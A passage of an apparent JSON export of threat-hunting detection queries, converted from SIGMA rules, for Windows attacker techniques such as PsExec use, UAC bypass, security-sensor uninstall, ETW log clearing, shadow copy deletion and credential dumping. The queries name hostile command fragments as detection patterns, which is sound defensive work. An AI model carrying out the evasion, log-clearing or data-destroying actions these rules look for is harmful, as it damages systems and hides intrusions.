            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" run run-cmd \" and (not (src.process.image.path contains \"\\cleanapi.exe\" or src.process.image.path contains \"\\kavremover.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 334
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Shadow Copies storage symbolic link creation using operating systems utilities",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003",
                "t1003"
            ],
            "name": "VolumeShadowCopy Symlink Creation Via Mklink",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"mklink\" and tgt.process.cmdline contains \"HarddiskVolumeShadowCopy\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 335
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects UAC Bypass Attempt Using Microsoft Connection Manager Profile Installer Autoelevate-capable COM Objects (e.g. UACMe ID of 41, 43, 58 or 65)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548",
                "t1218"
            ],
            "name": "CMSTP UAC Bypass via COM Object Access",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\DllHost.exe\" and (src.process.cmdline contains \" /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}\" or src.process.cmdline contains \" /Processid:{3E000D72-A845-4CD9-BD83-80C07C3B881F}\" or src.process.cmdline contains \" /Processid:{BD54C901-076B-434E-B6C7-17C531F4AB41}\" or src.process.cmdline contains \" /Processid:{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}\" or src.process.cmdline contains \" /Processid:{E9495B87-D950-4AB5-87A5-FF6D70BF3E90}\") and (tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 336
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may disable security tools to avoid possible detection of their tools and activities by uninstalling Crowdstrike Falcon",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Uninstall Crowdstrike Falcon Sensor",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\WindowsSensor.exe\" and tgt.process.cmdline contains \" /uninstall\" and tgt.process.cmdline contains \" /quiet\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 337
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of GfxDownloadWrapper.exe with a URL as an argument to download file.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "Arbitrary File Download Via GfxDownloadWrapper.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\GfxDownloadWrapper.exe\" and (tgt.process.cmdline contains \"http://\" or tgt.process.cmdline contains \"https://\")) and (not tgt.process.cmdline contains \"https://gameplayapi.intel.com/\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 338
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect use of X509Enrollment",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1553"
            ],
            "name": "Suspicious X509Enrollment - Process Creation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"X509Enrollment.CBinaryConverter\" or tgt.process.cmdline contains \"884e2002-217d-11da-b2a4-000e7bbb2b09\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 339
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) from non default locations as seen with bumblebee activity",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Wab Execution From Non Default Location",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\wab.exe\" or tgt.process.image.path contains \"\\wabmig.exe\") and (not (tgt.process.image.path contains \"C:\\Windows\\WinSxS\\\" or tgt.process.image.path contains \"C:\\Program Files\\Windows Mail\\\" or tgt.process.image.path contains \"C:\\Program Files (x86)\\Windows Mail\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 340
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network sniffing via use of network tools such as \"tshark\", \"windump\".\nNetwork sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection.\nAn adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1040"
            ],
            "name": "Potential Network Sniffing Activity Using Network Tools",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\tshark.exe\" and tgt.process.cmdline contains \"-i\") or tgt.process.image.path contains \"\\windump.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 341
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of a renamed \"jusched.exe\" as seen used by the cobalt group",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Renamed Jusched.EXE Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.displayName in (\"Java Update Scheduler\",\"Java(TM) Update Scheduler\")) and (not tgt.process.image.path contains \"\\jusched.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 342
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects command line activity that tries to clear or disable any ETW trace log which could be a sign of logging evasion.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1070",
                "t1562"
            ],
            "name": "ETW Trace Evasion Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"cl\" and tgt.process.cmdline contains \"/Trace\") or (tgt.process.cmdline contains \"clear-log\" and tgt.process.cmdline contains \"/Trace\") or (tgt.process.cmdline contains \"sl\" and tgt.process.cmdline contains \"/e:false\") or (tgt.process.cmdline contains \"set-log\" and tgt.process.cmdline contains \"/e:false\") or (tgt.process.cmdline contains \"logman\" and tgt.process.cmdline contains \"update\" and tgt.process.cmdline contains \"trace\" and tgt.process.cmdline contains \"--p\" and tgt.process.cmdline contains \"-ets\") or tgt.process.cmdline contains \"Remove-EtwTraceProvider\" or (tgt.process.cmdline contains \"Set-EtwTraceProvider\" and tgt.process.cmdline contains \"0x11\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 343
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution from an Alternate Data Stream (ADS). Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564"
            ],
            "name": "Execute From Alternate Data Streams",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"txt:\" and ((tgt.process.cmdline contains \"type \" and tgt.process.cmdline contains \" > \") or (tgt.process.cmdline contains \"makecab \" and tgt.process.cmdline contains \".cab\") or (tgt.process.cmdline contains \"reg \" and tgt.process.cmdline contains \" export \") or (tgt.process.cmdline contains \"regedit \" and tgt.process.cmdline contains \" /E \") or (tgt.process.cmdline contains \"esentutl \" and tgt.process.cmdline contains \" /y \" and tgt.process.cmdline contains \" /d \" and tgt.process.cmdline contains \" /o \"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 344
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious RDP session redirect using tscon.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1563",
                "t1021"
            ],
            "name": "Suspicious RDP Redirect Using TSCON",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \" /dest:rdp-tcp#\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 345
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious launch of the PSEXESVC service on this system and a sub process run as LOCAL_SYSTEM (-s), which means that someone remotely started a command on this system running it with highest privileges and not only the privileges of the login user account (e.g. the administrator account)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "PsExec Service Child Process Execution as LOCAL SYSTEM",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path=\"C:\\Windows\\PSEXESVC.exe\" and (tgt.process.user contains \"AUTHORI\" or tgt.process.user contains \"AUTORI\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 346
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a Windows command line executable started from MMC",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1021"
            ],
            "name": "MMC Spawning Windows Shell",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\mmc.exe\" and ((tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\sh.exe\" or tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\reg.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\") or tgt.process.image.path contains \"\\BITSADMIN\"))) | columns tgt.process.cmdline,tgt.process.image.path,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 347
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects calls to \"LoadAssemblyFromPath\" or \"LoadAssemblyFromNS\" that are part of the \"CL_LoadAssembly.ps1\" script. This can be abused to load different assemblies and bypass App locker controls.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1216"
            ],
            "name": "Assembly Loading Via CL_LoadAssembly.ps1",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"LoadAssemblyFromPath \" or tgt.process.cmdline contains \"LoadAssemblyFromNS \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 348
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of stordiag.exe to execute schtasks.exe systeminfo.exe and fltmc.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Execution via stordiag.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\stordiag.exe\" and (tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\systeminfo.exe\" or tgt.process.image.path contains \"\\fltmc.exe\")) and (not (src.process.image.path contains \"c:\\windows\\system32\\\" or src.process.image.path contains \"c:\\windows\\syswow64\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 349
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects deletion of Windows Volume Shadow Copies with PowerShell code and Get-WMIObject. This technique is used by numerous ransomware families such as Sodinokibi/REvil",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1490"
            ],
            "name": "Deletion of Volume Shadow Copies via WMI with PowerShell",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"Get-WmiObject\" or tgt.process.cmdline contains \"gwmi\" or tgt.process.cmdline contains \"Get-CimInstance\" or tgt.process.cmdline contains \"gcim\") and tgt.process.cmdline contains \"Win32_ShadowCopy\" and (tgt.process.cmdline contains \".Delete()\" or tgt.process.cmdline contains \"Remove-WmiObject\" or tgt.process.cmdline contains \"rwmi\" or tgt.process.cmdline contains \"Remove-CimInstance\" or tgt.process.cmdline contains \"rcim\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 350
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects when an attacker tries to add a new network provider in order to dump clear text credentials, similar to how the NPPSpy tool does it",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "Potential Credential Dumping Attempt Using New NetworkProvider - CLI",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\System\\CurrentControlSet\\Services\\\" and tgt.process.cmdline contains \"\\NetworkProvider\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
